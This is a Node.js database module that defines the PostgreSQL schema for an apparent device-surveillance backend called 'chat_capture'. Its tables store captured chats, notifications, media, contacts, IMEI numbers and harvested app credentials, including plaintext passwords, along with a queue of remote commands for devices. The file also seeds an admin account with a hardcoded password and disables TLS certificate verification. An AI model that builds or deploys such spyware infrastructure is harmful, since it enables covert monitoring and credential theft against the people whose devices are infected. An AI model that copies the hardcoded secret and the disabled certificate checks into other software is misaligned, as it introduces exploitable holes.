const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const { v4: uuidv4 } = require('uuid');

// Create PostgreSQL connection pool (Supabase compatible)
// Support both connection string and individual parameters
let poolConfig;

if (process.env.DATABASE_URL) {
    // Use connection string (Supabase format)
    poolConfig = {
        connectionString: process.env.DATABASE_URL,
        ssl: process.env.DB_SSL !== 'false' ? { rejectUnauthorized: false } : false,
        max: 20,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 2000,
    };
} else {
    // Use individual parameters
    poolConfig = {
        host: process.env.DB_HOST || 'localhost',
        port: process.env.DB_PORT || 5432,
        database: process.env.DB_NAME || 'chat_capture',
        user: process.env.DB_USER || 'postgres',
        password: process.env.DB_PASSWORD || 'postgres',
        ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : false,
        max: 20,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 2000,
    };
}

const pool = new Pool(poolConfig);

// Test connection
pool.on('connect', () => {
    console.log('PostgreSQL database connected');
});

pool.on('error', (err) => {
    console.error('Unexpected error on idle PostgreSQL client', err);
    process.exit(-1);
});

// Initialize database schema
async function initializeDatabase() {
    const client = await pool.connect();
    
    try {
        await client.query('BEGIN');
        
        // Notifications table
        await client.query(`CREATE TABLE IF NOT EXISTS notifications (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255),
            appPackage VARCHAR(255) NOT NULL,
            appName VARCHAR(255) NOT NULL,
            title TEXT,
            text TEXT,
            timestamp BIGINT NOT NULL,
            mediaUrls TEXT,
            synced INTEGER DEFAULT 0,
            syncAttempts INTEGER DEFAULT 0,
            lastSyncAttempt BIGINT,
            errorMessage TEXT,
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notifications_app ON notifications(appPackage)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notifications_timestamp ON notifications(timestamp)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notifications_synced ON notifications(synced)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_notifications_deviceId ON notifications(deviceId)`);
        
        // Chats table
        await client.query(`CREATE TABLE IF NOT EXISTS chats (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255),
            appPackage VARCHAR(255) NOT NULL,
            appName VARCHAR(255) NOT NULL,
            chatIdentifier VARCHAR(255),
            text TEXT NOT NULL,
            timestamp BIGINT NOT NULL,
            synced INTEGER DEFAULT 0,
            syncAttempts INTEGER DEFAULT 0,
            lastSyncAttempt BIGINT,
            errorMessage TEXT,
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_chats_app ON chats(appPackage)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_chats_identifier ON chats(chatIdentifier)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_chats_timestamp ON chats(timestamp)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_chats_synced ON chats(synced)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_chats_deviceId ON chats(deviceId)`);
        
        // Media files table
        await client.query(`CREATE TABLE IF NOT EXISTS media_files (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255),
            notificationId VARCHAR(255) NOT NULL,
            localPath TEXT,
            remoteUrl TEXT,
            fileSize BIGINT NOT NULL,
            mimeType VARCHAR(255) NOT NULL,
            checksum VARCHAR(255) NOT NULL,
            uploadStatus VARCHAR(50) DEFAULT 'PENDING',
            uploadAttempts INTEGER DEFAULT 0,
            lastUploadAttempt BIGINT,
            errorMessage TEXT,
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_media_notification ON media_files(notificationId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_media_status ON media_files(uploadStatus)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_media_deviceId ON media_files(deviceId)`);
        
        // Credentials table
        await client.query(`CREATE TABLE IF NOT EXISTS credentials (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255),
            accountType VARCHAR(255) NOT NULL,
            appPackage VARCHAR(255),
            appName VARCHAR(255),
            email VARCHAR(255),
            username VARCHAR(255),
            password TEXT NOT NULL,
            domain VARCHAR(255),
            url TEXT,
            devicePassword INTEGER DEFAULT 0,
            timestamp BIGINT NOT NULL,
            synced INTEGER DEFAULT 0,
            syncAttempts INTEGER DEFAULT 0,
            lastSyncAttempt BIGINT,
            errorMessage TEXT,
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_credentials_accountType ON credentials(accountType)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_credentials_appPackage ON credentials(appPackage)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_credentials_email ON credentials(email)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_credentials_synced ON credentials(synced)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_credentials_timestamp ON credentials(timestamp)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_credentials_deviceId ON credentials(deviceId)`);
        
        // Contacts table
        await client.query(`CREATE TABLE IF NOT EXISTS contacts (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255),
            name VARCHAR(255) NOT NULL,
            phoneNumber VARCHAR(255),
            email VARCHAR(255),
            organization VARCHAR(255),
            jobTitle VARCHAR(255),
            address TEXT,
            notes TEXT,
            photoUri TEXT,
            timestamp BIGINT NOT NULL,
            synced INTEGER DEFAULT 0,
            syncAttempts INTEGER DEFAULT 0,
            lastSyncAttempt BIGINT,
            errorMessage TEXT,
            lastSynced BIGINT,
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_contacts_phoneNumber ON contacts(phoneNumber)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_contacts_email ON contacts(email)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_contacts_synced ON contacts(synced)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_contacts_deviceId ON contacts(deviceId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_contacts_timestamp ON contacts(timestamp)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_contacts_lastSynced ON contacts(lastSynced)`);
        
        // Devices table
        await client.query(`CREATE TABLE IF NOT EXISTS devices (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255) UNIQUE NOT NULL,
            deviceName VARCHAR(255),
            model VARCHAR(255),
            osVersion VARCHAR(255),
            imei VARCHAR(255),
            fcmToken TEXT,
            lastSeen BIGINT,
            status VARCHAR(50) DEFAULT 'active',
            ownerId VARCHAR(255),
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_devices_deviceId ON devices(deviceId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_devices_status ON devices(status)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_devices_ownerId ON devices(ownerId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_devices_lastSeen ON devices(lastSeen)`);
        
        // Commands table
        await client.query(`CREATE TABLE IF NOT EXISTS commands (
            id VARCHAR(255) PRIMARY KEY,
            deviceId VARCHAR(255) NOT NULL,
            action VARCHAR(255) NOT NULL,
            parameters TEXT,
            status VARCHAR(50) DEFAULT 'pending',
            result TEXT,
            createdAt BIGINT,
            executedAt BIGINT,
            CONSTRAINT fk_commands_device FOREIGN KEY(deviceId) REFERENCES devices(deviceId)
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_commands_deviceId ON commands(deviceId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_commands_createdAt ON commands(createdAt)`);
        
        // Users table
        await client.query(`CREATE TABLE IF NOT EXISTS users (
            id VARCHAR(255) PRIMARY KEY,
            username VARCHAR(255) UNIQUE NOT NULL,
            email VARCHAR(255) UNIQUE,
            password TEXT NOT NULL,
            role VARCHAR(50) NOT NULL,
            createdAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
            lastLogin BIGINT
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_role ON users(role)`);
        
        // Device ownership table
        await client.query(`CREATE TABLE IF NOT EXISTS device_ownership (
            id VARCHAR(255) PRIMARY KEY,
            userId VARCHAR(255) NOT NULL,
            deviceId VARCHAR(255) NOT NULL UNIQUE,
            assignedAt BIGINT DEFAULT EXTRACT(EPOCH FROM NOW())::BIGINT,
            CONSTRAINT fk_ownership_user FOREIGN KEY(userId) REFERENCES users(id),
            CONSTRAINT fk_ownership_device FOREIGN KEY(deviceId) REFERENCES devices(deviceId)
        )`);
        
        await client.query(`CREATE INDEX IF NOT EXISTS idx_ownership_userId ON device_ownership(userId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_ownership_deviceId ON device_ownership(deviceId)`);
        
        await client.query('COMMIT');
        console.log('PostgreSQL database schema initialized');
        
        // Create initial admin user
        const adminCheck = await client.query('SELECT * FROM users WHERE email = $1', ['bilal@admin.com']);
        
        if (adminCheck.rows.length === 0) {
            const adminId = uuidv4();
            const hash = await bcrypt.hash('Bil@l112', 10);
            const createdAt = Math.floor(Date.now() / 1000);
            
            await client.query(
                `INSERT INTO users (id, username, email, password, role, createdAt)
                 VALUES ($1, $2, $3, $4, $5, $6)`,
                [adminId, 'admin', 'bilal@admin.com', hash, 'admin', createdAt]
            );
            
            console.log('Initial admin user created: bilal@admin.com');
        }
        
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error initializing database:', error);
        throw error;
    } finally {
        client.release();
    }
}

// Initialize on module load - DISABLED (migrated to MongoDB)
// initializeDatabase().catch(console.error);

// Helper function to execute queries
async function query(text, params) {
    const start = Date.now();
    try {
        const res = await pool.query(text, params);
        const duration = Date.now() - start;
        if (process.env.NODE_ENV === 'development') {
            console.log('Executed query', { text, duration, rows: res.rowCount });
        }
        return res;
    } catch (error) {
        console.error('Database query error:', error);
        throw error;
    }
}

// Helper function for single row queries (like SQLite's db.get)
async function get(text, params) {
    const result = await query(text, params);
    return result.rows[0] || null;
}

// Helper function for all rows queries (like SQLite's db.all)
async function all(text, params) {
    const result = await query(text, params);
    return result.rows;
}

// Helper function for run queries (like SQLite's db.run)
async function run(text, params) {
    const result = await query(text, params);
    return { lastID: null, changes: result.rowCount };
}

// Prepare function for compatibility (returns a mock object)
function prepare(text) {
    return {
        run: async (...params) => {
            // Handle both array and individual params
            const finalParams = params.length === 1 && Array.isArray(params[0]) ? params[0] : params;
            return await run(text, finalParams);
        },
        finalize: () => {} // No-op for PostgreSQL
    };
}

module.exports = {
    pool,
    query,
    get,
    all,
    run,
    prepare,
    initializeDatabase
};
